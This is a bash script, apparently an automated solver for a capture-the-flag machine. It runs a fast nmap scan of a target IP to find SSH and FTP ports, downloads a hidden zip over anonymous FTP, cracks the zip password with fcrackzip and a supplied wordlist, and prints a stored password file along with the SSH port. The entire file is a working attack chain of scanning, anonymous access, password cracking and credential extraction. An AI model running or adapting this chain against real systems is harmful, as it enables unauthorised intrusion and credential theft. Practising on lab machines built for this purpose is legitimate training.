#!/bin/bash

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running Cracker script."
    exit 1
  fi
}

missing nmap
missing fcrackzip
missing unzip

rm -rf boot 2>/dev/null
rm -rf .I_saved_it_harry 2>/dev/null
rm -rf file.zip 2>/dev/null
rm -rf ssh_port.txt 2>/dev/null

while getopts "w:i:" opt; do
  case $opt in
    w)
      WORDLIST_PATH="$OPTARG"
      ;;
    i)
      IP="$OPTARG"
      ;;
    \?)
      echo "Usage: $0 -w wordlist_path -i target_ip"
      exit 1
      ;;
  esac
done

if [ -z "$WORDLIST_PATH" ] || [ -z "$IP" ]; then
  echo "Usage: $0 -w 'WORDLIST HERE' -i 'MACHINE IP'"
  exit 1
fi

# Note: You can replace the 'nmap' tool with any other network scanning tool of your choice. 
nmap_result=$(nmap -sV -p 1-20000 -T4 --min-rate 20000 "$IP")

SSH_PORT=$(echo "$nmap_result" | grep 'ssh' | awk '{print $1}' | cut -d '/' -f 1)
FTP_PORT=$(echo "$nmap_result" | grep 'ftp' | awk '{print $1}' | cut -d '/' -f 1)

echo "The ssh port is : $SSH_PORT" > ssh_port.txt

if [ -z "$FTP_PORT" ] || [ -z "$SSH_PORT" ]; then
  echo "Try again."
  exit 1
fi

wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip && fcrackzip -v -u -D -p $WORDLIST_PATH file.zip && unzip file.zip && cat boot/.pass && echo "" && cat ssh_port.txt
